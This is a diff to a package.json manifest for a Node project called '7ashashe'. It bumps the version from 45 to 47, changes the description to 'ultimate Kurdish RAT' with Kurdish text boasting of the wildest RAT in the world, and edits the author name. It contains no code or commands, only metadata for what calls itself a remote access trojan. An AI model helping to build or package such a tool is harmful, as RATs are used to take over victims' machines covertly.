@@ -1,7 +1,7 @@
 {
-  "name": "7ashashe-v45",
-  "version": "45.0.0",
-  "description": "7ASHASHE ULTIMATE KURDISH RAT",
+  "name": "7ashashe-v47",
+  "version": "47.0.0",
+  "description": "7ASHASHE ULTIMATE KURDISH RAT - وەحشی ترین RAT لە جیهاندا",
   "main": "server.js",
   "scripts": {
     "start": "node server.js"
@@ -25,7 +25,7 @@
     "kurdish",
     "7ashashe"
   ],
-  "author": "7ASHASHE",
+  "author": "عەزازیل 7ASHASHE",
   "license": "UNLICENSED",
   "private": true
 }
